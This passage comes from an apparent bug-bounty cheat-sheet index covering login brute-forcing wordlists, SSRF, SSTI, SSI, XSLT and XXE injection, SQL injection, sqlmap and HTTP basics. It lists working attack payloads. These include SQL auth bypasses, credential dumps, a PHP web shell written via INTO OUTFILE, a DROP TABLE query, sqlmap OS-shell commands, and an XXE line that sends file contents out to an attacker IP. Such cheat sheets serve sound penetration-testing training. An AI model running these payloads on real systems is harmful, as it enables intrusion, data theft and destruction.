-f</code>"},{"location":"bug-bounty-guide/login-brute-forcing/#custom-wordlists","title":"Custom Wordlists","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#username-anarchy","title":"Username Anarchy","text":"<p>Generates potential usernames based on a target's name. | Command | Description | |---------|-------------| | <code>username-anarchy Jane Smith</code> | Generate possible usernames for \"Jane Smith\" | | <code>username-anarchy -i names.txt</code> | Use a file (names.txt) with names for input. Can handle space, CSV, or TAB delimited names. | | <code>username-anarchy -a --country us</code> | Automatically generate usernames using common names from the US dataset. | | <code>username-anarchy -l</code> | List available username format plugins. | | <code>username-anarchy -f format1,format2</code> | Use specific format plugins for username generation (comma-separated). | | <code>username-anarchy -@ example.com</code> | Append @example.com as a suffix to each username. | | <code>username-anarchy --case-insensitive</code> | Generate usernames in case-insensitive (lowercase) format. |</p>"},{"location":"bug-bounty-guide/login-brute-forcing/#cupp-common-user-passwords-profiler","title":"CUPP (Common User Passwords Profiler)","text":"<p>Creates personalized password wordlists based on gathered intelligence. | Command | Description | |---------|-------------| | <code>cupp -i</code> | Generate wordlist based on personal information (interactive mode). | | <code>cupp -w profiles.txt</code> | Generate a wordlist from a predefined profile file. | | <code>cupp -l</code> | Download popular password lists like rockyou.txt. |</p>"},{"location":"bug-bounty-guide/login-brute-forcing/#password-policy-filtering","title":"Password Policy Filtering","text":"<p>Password policies often dictate specific requirements for password strength, such as minimum length, inclusion of certain character types, or exclusion of common patterns. grep combined with regular expressions can filter wordlists to identify passwords that adhere to a given policy.</p>"},{"location":"bug-bounty-guide/login-brute-forcing/#policy-requirements-and-grep-regex-patterns","title":"Policy Requirements and Grep Regex Patterns","text":"Policy Requirement Grep Regex Pattern Explanation Minimum Length (e.g., 8 characters) <code>grep -E '^.{8,}$' wordlist.txt</code> <code>^</code> matches the start of the line, <code>.</code> matches any character, <code>{8,}</code> matches 8 or more occurrences, <code>$</code> matches the end of the line. At Least One Uppercase Letter <code>grep -E '[A-Z]' wordlist.txt</code> <code>[A-Z]</code> matches any uppercase letter. At Least One Lowercase Letter <code>grep -E '[a-z]' wordlist.txt</code> <code>[a-z]</code> matches any lowercase letter. At Least One Digit <code>grep -E '[0-9]' wordlist.txt</code> <code>[0-9]</code> matches any digit. At Least One Special Character <code>grep -E '[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]' wordlist.txt</code> <code>[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]</code> matches any special character (symbol). No Consecutive Repeated Characters <code>grep -E '(.)\\1' wordlist.txt</code> <code>(.)</code> captures any character, <code>\\1</code> matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use <code>grep -v</code> to invert the match. Exclude Common Patterns (e.g., \"password\") <code>grep -v -i 'password' wordlist.txt</code> <code>-v</code> inverts the match, <code>-i</code> makes the search case-insensitive. This pattern will exclude any line containing \"password\" (or \"Password\", \"PASSWORD\", etc.). Exclude Dictionary Words <code>grep -v -f dictionary.txt wordlist.txt</code> <code>-f</code> reads patterns from a file. <code>dictionary.txt</code> should contain a list of common dictionary words, one per line. Combination of Requirements <code>grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]'</code> Filters a wordlist to meet multiple password policy requirements. Ensures each word has a minimum length of 8 characters and contains at least one uppercase letter."},{"location":"bug-bounty-guide/server-side-attacks/","title":"Server-Side Attacks","text":""},{"location":"bug-bounty-guide/server-side-attacks/#ssrf","title":"SSRF","text":""},{"location":"bug-bounty-guide/server-side-attacks/#exploitation","title":"Exploitation","text":"<ul> <li>internal portscan by accessing ports on localhost</li> <li>accessing restricted endpoints</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#protocols","title":"Protocols","text":"<ul> <li><code>http://127.0.0.1/</code></li> <li><code>file:///etc/passwd</code></li> <li><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin</code></li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#ssti","title":"SSTI","text":""},{"location":"bug-bounty-guide/server-side-attacks/#exploitation_1","title":"Exploitation","text":"<p>Templating Engines are used to dynamically generate content</p>"},{"location":"bug-bounty-guide/server-side-attacks/#test-string","title":"Test String","text":"<ul> <li><code>${{&lt;%[%'\"}}%\\.</code></li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#ssi-injection-directives","title":"SSI Injection - Directives","text":"Directive Description <code>&lt;!--#printenv --&gt;</code> Print variables <code>&lt;!--#config errmsg=\"Error!\" --&gt;</code> Change config <code>&lt;!--#echo var=\"DOCUMENT_NAME\" var=\"DATE_LOCAL\" --&gt;</code> Print specific variable <code>&lt;!--#exec cmd=\"whoami\" --&gt;</code> Execute command <code>&lt;!--#include virtual=\"index.html\" --&gt;</code> Include web file"},{"location":"bug-bounty-guide/server-side-attacks/#xslt-injection","title":"XSLT Injection","text":""},{"location":"bug-bounty-guide/server-side-attacks/#elements","title":"Elements","text":"Element Description <code>&lt;xsl:template&gt;</code> Indicates an XSL template. Can contain a match attribute that contains a path in the XML-document that the template applies to <code>&lt;xsl:value-of&gt;</code> Extracts the value of the XML node specified in the select attribute <code>&lt;xsl:for-each&gt;</code> Enables looping over all XML nodes specified in the select attribute <code>&lt;xsl:sort&gt;</code> Specifies the node to sort elements in a for loop by in the select argument. A sort order may be specified in the order argument <code>&lt;xsl:if&gt;</code> Used to test for conditions on a node. The condition is specified in the test argument"},{"location":"bug-bounty-guide/server-side-attacks/#injection-payloads","title":"Injection Payloads","text":""},{"location":"bug-bounty-guide/server-side-attacks/#information-disclosure","title":"Information Disclosure","text":"Payload Description <code>&lt;xsl:value-of select=\"system-property('xsl:version')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:vendor')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:vendor-url')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:product-name')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:product-version')\" /&gt;</code>"},{"location":"bug-bounty-guide/server-side-attacks/#lfi","title":"LFI","text":"Payload Description <code>&lt;xsl:value-of select=\"unparsed-text('/etc/passwd', 'utf-8')\" /&gt;</code> <code>&lt;xsl:value-of select=\"php:function('file_get_contents','/etc/passwd')\" /&gt;</code>"},{"location":"bug-bounty-guide/server-side-attacks/#rce","title":"RCE","text":"Payload Description <code>&lt;xsl:value-of select=\"php:function('system','id')\" /&gt;</code>"},{"location":"bug-bounty-guide/session-security/","title":"Session Security","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/","title":"SQL Injection","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#types-of-sql-injection","title":"Types of SQL Injection","text":"Type Description Example Useful/Where Can't Be Used Classic Direct injection into input fields. <code>' OR '1'='1</code> Useful for basic input fields; can't use if input is sanitized. Union-Based Uses UNION operator to extract data. <code>' UNION SELECT NULL, username, password --</code> Useful with multiple columns; can't use if UNION is blocked. Error-Based Exploits database errors to reveal data. <code>' AND 1=(SELECT COUNT(*))</code> Useful with error messages; can't use if errors are suppressed. Blind (Boolean) Infers data via true/false responses. <code>' AND SUBSTRING(version(), 1, 1)=5</code> Useful when errors are suppressed; can't use if responses are identical. Blind (Time-Based) Delays response based on conditions. <code>' OR IF(1=1, SLEEP(5), 0)</code> Useful with no output; can't use if timing controls are strict. Stacked Queries Executes multiple statements. <code>'; DROP TABLE users; --</code> Useful if multi-queries allowed; can't use if DBMS restricts it."},{"location":"bug-bounty-guide/sql-injection-fundamentals/#useful-links","title":"Useful links","text":"<ul> <li>MySQL Documentation</li> <li>Data types</li> <li>MariaDB Documentation</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#mysql","title":"MySQL","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#general","title":"General","text":"Command Description <code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code> Login to mysql database. No space after -p when entering password <code>CREATE DATABASE users;</code> Create a new datase called users <code>SHOW DATABASES;</code> List available databases <code>USE users;</code> Switch to database <p>Note: SQL statements are not case sensitive but names are. Note: 3306 is the default port for MySQL.</p>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#tables","title":"Tables","text":"Command Description <code>CREATE TABLE logins (id INT, ...);</code> Add a new table <code>SHOW TABLES;</code> List available tables in current database <code>DESCRIBE logins;</code> Show table properties and columns <code>INSERT INTO table_name VALUES (value_1,..);</code> Add values to table, requires values for all columns in the table <code>INSERT INTO table_name(username, password) VALUES ('john', 'john123!');</code> Add values to specific columns in a table Note: skipping columns with the 'NOT NULL' constraint will result in an error (unless AUTO_INCREMENT) <code>INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');</code> Insert multiple records at once by separating them with a comma <code>UPDATE logins SET password = 'change_password' WHERE id &gt; 1;</code> Update specific records"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#create-table-example","title":"Create table example","text":"<pre><code>CREATE TABLE logins (\n    id INT NOT NULL AUTO_INCREMENT, -- set to auto increment\n    username VARCHAR(100) UNIQUE NOT NULL, -- must be unique and cannot be left blank\n    password VARCHAR(100),\n    date_of_joining DATETIME DEFAULT NOW(), -- default value will be when the entry is added\n    PRIMARY KEY (id) -- makes the id column the primary key\n    );\n</code></pre>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#columns","title":"Columns","text":"Command Description <code>SELECT * FROM table_name;</code> Show all columns in a table <code>SELECT username, password FROM table_name;</code> Show specific columns in a table <code>DROP TABLE logins;</code> Delete a table <code>ALTER TABLE logins ADD newColumn INT;</code> Add new column <code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;</code> Rename column <code>ALTER TABLE logins MODIFY oldColumn DATE;</code> Change column datatype <code>ALTER TABLE logins DROP oldColumn;</code> Delete column"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#output","title":"Output","text":"Command Description <code>SELECT * FROM logins ORDER BY password;</code> Sort by column (ascending by default) <code>SELECT * FROM logins ORDER BY password DESC;</code> Sort by column in descending order <code>SELECT * FROM logins ORDER BY password DESC, id ASC;</code> Sort by two-columns, by id for duplicate password entries <code>SELECT * FROM logins LIMIT 2;</code> Only show first two results <code>SELECT * FROM logins LIMIT 1, 2;</code> Only show first two results starting from index 2 (1 being the offset in this example) <code>SELECT * FROM logins WHERE id &gt; 1;</code> List results that meet a condition <code>SELECT * FROM logins WHERE username LIKE 'admin%';</code> List results where the name is similar to a given string <code>SELECT * FROM logins WHERE username like '___';</code> Where username is exactly 3 chars, '_' = 1 char <code>SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';</code> Last name of the employee whose first name starts with Bar and was hired on 1990-01-01 <code>SELECT COUNT(*) FROM titles WHERE emp_no &gt; 10000 OR title NOT LIKE '%engineer%';</code> The number of all records where the employee number is greater than 10000 or the employee title does not contain the string engineer"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#mysql-operator-precedence","title":"MySQL Operator Precedence","text":"<ul> <li>Division (/), Multiplication (*), and Modulus (%)</li> <li>Addition (+) and Subtraction (-)</li> <li>Comparison (=, &gt;, &lt;, &lt;=, &gt;=, !=, LIKE)</li> <li>NOT (!)</li> <li>AND (&amp;&amp;)</li> <li>OR (||)</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#sql-injection_1","title":"SQL Injection","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#auth-bypass","title":"Auth Bypass","text":"Payload Description <code>admin' or '1'='1</code> Basic Auth Bypass <code>admin')-- -</code> Basic Auth Bypass With comments"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#auth-bypass-payloads","title":"Auth Bypass Payloads","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#union-injection","title":"Union Injection","text":"Payload Description <code>' order by 1-- -</code> Detect number of columns using order by <code>cn' UNION select 1,2,3-- -</code> Detect number of columns using Union injection <code>cn' UNION select 1,@@version,3,4-- -</code> Basic Union injection <code>UNION select username, 2, 3, 4 from passwords-- -</code> Union injection for 4 columns"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#db-enumeration","title":"DB Enumeration","text":"Payload Description <code>SELECT @@version</code> Fingerprint MySQL with query output <code>SELECT SLEEP(5)</code> Fingerprint MySQL with no output <code>cn' UNION select 1,database(),2,3-- -</code> Current database name <code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code> List all databases <code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code> List all tables in a specific database <code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code> List all columns in a specific table <code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code> Dump data from a table in another database"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#privileges","title":"Privileges","text":"Payload Description <code>cn' UNION SELECT 1, user(), 3, 4-- -</code> Find current user <code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -</code> Find if user has admin privileges <code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee=\"'root'@'localhost'\"-- -</code> Find if all user privileges <code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -</code> Find which directories can be accessed through MySQL"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#file-injection","title":"File Injection","text":"Payload Description <code>cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- -</code> Read local file <code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code> Write a string to a local file <code>cn' union select \"\",'&lt;?php system($_REQUEST[0]); ?&gt;', \"\", \"\" into outfile '/var/www/html/shell.php'-- -</code> Write a web shell into the base web directory"},{"location":"bug-bounty-guide/sqlmap-essentials/","title":"SQLMap Essentials Cheat Sheet","text":""},{"location":"bug-bounty-guide/sqlmap-essentials/#commands","title":"Commands","text":"Command Description <code>sqlmap -h</code> View the basic help menu <code>sqlmap -hh</code> View the advanced help menu <code>sqlmap -u \"http://www.example.com/vuln.php?id=1\" --batch</code> Run SQLMap without asking for user input <code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code> SQLMap with POST request <code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code> POST request specifying an injection point with an asterisk <code>sqlmap -r req.txt</code> Passing an HTTP request file to SQLMap <code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code> Specifying a cookie header <code>sqlmap -u www.target.com --data='id=1' --method PUT</code> Specifying a PUT request <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" --batch -t /tmp/traffic.txt</code> Store traffic to an output file <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" -v 6 --batch</code> Specify verbosity level <code>sqlmap -u \"www.example.com/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"</code> Specifying a prefix or suffix <code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code> Specifying the level and risk <code>sqlmap -u \"http://www.example.com/?id=1\" --banner --current-user --current-db --is-dba</code> Basic DB enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --tables -D testdb</code> Table enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb -C name,surname</code> Table/row enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"</code> Conditional enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --schema</code> Database schema enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --search -T user</code> Searching for data <code>sqlmap -u \"http://www.example.com/?id=1\" --passwords --batch</code> Password enumeration and cracking <code>sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"</code> Anti-CSRF token bypass <code>sqlmap --list-tampers</code> List all tamper scripts <code>sqlmap -u \"http://www.example.com/case1.php?id=1\" --is-dba</code> Check for DBA privileges <code>sqlmap -u \"http://www.example.com/?id=1\" --file-read \"/etc/passwd\"</code> Reading a local file <code>sqlmap -u \"http://www.example.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"</code> Writing a file <code>sqlmap -u \"http://www.example.com/?id=1\" --os-shell</code> Spawning an OS shell"},{"location":"bug-bounty-guide/using-web-proxies/","title":"Using Web Proxies","text":""},{"location":"bug-bounty-guide/using-web-proxies/#tools","title":"Tools","text":"<ul> <li>Burp Suite</li> <li>OWASP ZAP</li> <li>Foxy Proxy</li> <li>Proxychains</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#setup","title":"Setup","text":"<ul> <li>Configure proxy settings/install and configure foxy proxy</li> <li>Add certificate</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#tool-functions","title":"Tool Functions","text":"Function Burp ZAP Intercepting Requests Proxy tab, Intercept sub-tab, toggle on Toggle green button or [Ctrl+B] Intercept Response Proxy &gt; Options, enable Intercept Response Automatically enabled with intercept Automatic Modification Proxy &gt; Options &gt; Match and Replace, add rule [Ctrl+R] or Replacer in Options Repeating Requests [Ctrl+R] or right-click, send to Repeater Right-click, select Open/Resend URL Encoding Right-click, Convert Selection &gt; URL Encode, or [Ctrl+U] Auto-encodes request data before sending Decoding Decoder tab [Ctrl+E] Fuzzing https://academy.hackthebox.com/module/110/section/1054 https://academy.hackthebox.com/module/110/section/1056 Web Scanner https://academy.hackthebox.com/module/110/section/1084 https://academy.hackthebox.com/module/110/section/1086 Extensions https://portswigger.net/bappstore https://www.zaproxy.org/addons/"},{"location":"bug-bounty-guide/using-web-proxies/#burp-shortcuts","title":"Burp Shortcuts","text":"Shortcut Description [CTRL+R] Send to repeater [CTRL+SHIFT+R] Go to repeater [CTRL+I] Send to intruder [CTRL+SHIFT+I] Go to intruder [CTRL+U] URL encode [CTRL+SHIFT+U] URL decode"},{"location":"bug-bounty-guide/using-web-proxies/#zap-shortcuts","title":"ZAP Shortcuts","text":"Shortcut Description [CTRL+B] Toggle intercept on/off [CTRL+R] Go to replacer [CTRL+E] Go to encode/decode/hash"},{"location":"bug-bounty-guide/using-web-proxies/#firefox-shortcuts","title":"Firefox Shortcuts","text":"Shortcut Description [CTRL+SHIFT+R] Force Refresh Page [F12] Open Developer Tools [CTRL+SHIFT+I] Open Inspector [CTRL+SHIFT+E] Open Network Panel [CTRL+SHIFT+J] Open Console [CTRL+U] View Page Source"},{"location":"bug-bounty-guide/web-attacks/","title":"Web Attacks","text":""},{"location":"bug-bounty-guide/web-attacks/#http-verb-tampering","title":"HTTP Verb Tampering","text":""},{"location":"bug-bounty-guide/web-attacks/#http-method","title":"HTTP Method","text":"<ul> <li>HEAD</li> <li>PUT</li> <li>DELETE</li> <li>OPTIONS</li> <li>PATCH</li> </ul> Command Description <code>-X OPTIONS</code> Set HTTP Method with Curl"},{"location":"bug-bounty-guide/web-attacks/#idor","title":"IDOR","text":""},{"location":"bug-bounty-guide/web-attacks/#identify-idors","title":"Identify IDORs","text":"<ul> <li>In URL parameters &amp; APIs</li> <li>In AJAX Calls</li> <li>By understanding reference hashing/encoding</li> <li>By comparing user roles</li> </ul> Command Description <code>md5sum</code> MD5 hash a string <code>base64</code> Base64 encode a string"},{"location":"bug-bounty-guide/web-attacks/#xxe","title":"XXE","text":"Code Description <code>&lt;!ENTITY xxe SYSTEM \"http://localhost/email.dtd\"&gt;</code> Define External Entity to a URL <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code> Define External Entity to a file path <code>&lt;!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;</code> Read PHP source code with base64 encode filter <code>&lt;!ENTITY % error \"&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;\"&gt;</code> Reading a file through a PHP error <code>&lt;!ENTITY % oob \"&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;\"&gt;</code> Reading a file OOB exfiltration"},{"location":"bug-bounty-guide/web-requests/","title":"Web Requests","text":""},{"location":"bug-bounty-guide/web-requests/#http-response-codes","title":"HTTP Response Codes","text":""},{"location":"bug-bounty-guide/web-requests/#classes","title":"Classes","text":"Class Description 1xx Provides information, does not affect request processing 2xx Indicates a successful request 3xx Indicates server redirection of the client 4xx Signifies improper client requests (e.g., nonexistent resource or bad format) 5xx Indicates an issue with the HTTP server"},{"location":"bug-bounty-guide/web-requests/#specific-codes","title":"Specific Codes","text":"Code Name Description 100 Continue Request can continue 200 OK Request successful 201 Created Resource created 204 No Content Request successful, no content 301 Moved Permanently Resource moved permanently 302 Found Resource temporarily moved 400 Bad Request Invalid request 401 Unauthorized Authentication required 403 Forbidden Access denied 404 Not Found Resource not found 405 Method Not Allowed Known by the server but has been disabled and cannot be used 408 Request Timeout Sent on an idle connection by some servers, even without any previous request by the client 500 Internal Server Error Server error 502 Bad Gateway Invalid gateway response 503 Service Unavailable Server temporarily unavailable 504 Gateway Timeout The server is acting as a gateway and cannot get a response in time"},{"location":"bug-bounty-guide/web-requests/#http-headers","title":"HTTP Headers","text":"<p>Complete list of standard headers</p>"},{"location":"bug-bounty-guide/web-requests/#request-headers","title":"Request Headers","text":"<p>Contain more information about the resource to be fetched, or about the client requesting the resource.</p> Header Example Description Accept <code>text/html,application/xhtml+xml</code> Media types acceptable for the response Authorization <code>Bearer eyJhbGciOiJIUzI1NiJ9...</code> Credentials for authentication User-Agent <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</code> Client software details Host <code>developer.mozilla.org</code> Domain name of the server Referer <code>https://example.com/page</code> URL of the page that initiated the request Cookie <code>sessionId=abc123; user=john</code> Cookies previously set by the server, sent with the request <p>Full list of request headers</p>"},{"location":"bug-bounty-guide/web-requests/#response-headers","title":"Response Headers","text":"<p>Hold additional information about the response, like its location or about the server providing it.</p> Header Example Description Location <code>https://developer.mozilla.org/</code> URL for redirection Server <code>Apache/2.4.41 (Unix)</code> Server software information Allow <code>GET, POST, HEAD</code> Allowed HTTP methods Date <code>Tue, 09 Sep 2025 09:09:00 GMT</code> Date and time of the response Set-Cookie <code>sessionId=abc123; Path=/; HttpOnly</code> Defines a cookie to be stored by the client WWW-Authenticate Authentication method and realm for access <p>Full list of response headers</p>"},{"location":"bug-bounty-guide/web-requests/#security-headers","title":"Security Headers","text":"<p>Response headers that enforce browser security policies to protect websites from attacks.</p> Header Example Description Content-Security-Policy <code>script-src 'self'</code> Sets rules for allowed resource sources, preventing XSS by restricting scripts to trusted domains. Strict-Transport-Security <code>max-age=31536000</code> Forces HTTPS connections, blocking plaintext HTTP to prevent traffic sniffing. Referrer-Policy <code>origin</code> Controls <code>Referer</code> header, limiting sensitive URL exposure during navigation. <p>OWASP secure response headers</p>"},{"location":"bug-bounty-guide/web-requests/#representationentity-headers","title":"Representation/Entity Headers","text":"<p>Contain information about the body of the resource, like its MIME type, or encoding/compression applied. Common to both request and response.</p> Header Example Description Content-Type <code>text/html; charset=UTF-8</code> MIME type and character encoding of the body Content-Encoding <code>gzip</code> Compression method applied to the body Content-Language <code>en-US</code> Language of the resource content Content-Location <code>/documents/foo.json</code> Alternate location for the returned data Boundary <code>----WebKitFormBoundary7MA4YWxkTrZu0gW</code> Delimiter for separating parts in multipart messages, e.g., form data or file uploads Media-Type <code>multipart/form-data</code> Specifies the MIME type of the message body, often used with multipart data"},{"location":"bug-bounty-guide/web-requests/#payload-headers","title":"Payload Headers","text":"<p>Contain representation-independent information about payload data, including content length and the encoding used for transport.</p> Header Example Description Content-Length <code>348</code> Size of the response body in bytes Transfer-Encoding <code>chunked</code> Encoding used for data transfer Trailer <code>Expires</code> Headers sent after the chunked response"},{"location":"bug-bounty-guide/web-requests/#http-request-methods","title":"HTTP Request Methods","text":"Method Description GET Requests a resource POST Submits data to create/update a resource PUT Updates a resource with provided data DELETE Removes a specified resource HEAD Requests headers only, no body OPTIONS Lists allowed methods for a resource PATCH Partially updates a resource TRACE Echoes the received request for debugging"},{"location":"bug-bounty-guide/web-requests/#curl","title":"cURL","text":"Command Description <code>curl -h</code> cURL help menu <code>curl inlanefreight.com</code> Basic GET request <code>curl -s -O inlanefreight.com/index.html</code> Download file <code>curl -k https://inlanefreight.com</code> Skip HTTPS (SSL) certificate validation <code>curl inlanefreight.com -v</code> Print full HTTP request/response details <code>curl -I https://www.inlanefreight.com</code> Send HEAD request (only prints response headers) <code>curl -i https://www.inlanefreight.com</code> Print response headers and response body <code>curl https://www.inlanefreight.com -A 'Mozilla/5.0'</code> Set User-Agent header <code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set HTTP basic authorization credentials <code>curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Pass HTTP basic authorization credentials in the URL <code>curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set request header <code>curl 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le'</code> Pass GET parameters <code>curl -X POST -d 'username=admin&amp;password=admin' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Send POST request with POST data <code>curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set request cookies <code>curl -X POST -d '{\"search\":\"london\"}' -H 'Content-Type: application/json' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code> Send POST request with JSON data"},{"location":"bug-bounty-guide/web-requests/#apis","title":"APIs","text":"Command Description <code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code> Read entry <code>curl -s http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ | jq</code> Read all entries <code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d '{\"city_name\":\"HTB_City\", \"country_name\":\"HTB\"}' -H 'Content-Type: application/json'</code> Create (add) entry <code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d '{\"city_name\":\"New_HTB_City\", \"country_name\":\"HTB\"}' -H 'Content-Type: application/json'</code> Update (modify) entry <code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code> Delete entry"},{"location":"bug-bounty-guide/web-requests/#browser-devtools","title":"Browser DevTools","text":"Shortcut Description <code>[CTRL+SHIFT+I]</code> or <code>[F12]</code> Show devtools <code>[CTRL+SHIFT+E]</code> Show Network tab <code>[CTRL+SHIFT+K]</code> Show Console tab <p>Tip: Use the network tab to observe dynamic content in action</p>"},{"location":"bug-bounty-guide/web-service-and-api-attacks/","title":"Web Service &amp; API Attacks","text":""}]}